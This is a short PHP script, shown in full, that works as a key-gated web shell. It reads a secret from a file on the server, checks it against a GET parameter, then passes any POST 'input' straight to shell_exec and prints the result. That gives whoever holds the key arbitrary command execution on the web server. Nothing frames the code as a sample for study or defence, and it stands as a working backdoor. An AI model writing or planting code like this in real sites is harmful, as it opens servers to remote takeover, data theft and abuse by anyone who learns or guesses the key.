<?php
        $api=shell_exec("cat /var/www/html/api.txt");
        $a=$_GET['api'];
        //echo $api;
        //echo $a;
if(isset($a)&&!empty($a)&&$a==$api){   
        $sab=$_POST['input'];
        //echo "string";
        $output=strval(shell_exec("$sab"));
        //echo "$output";
        echo("$output");
}

?>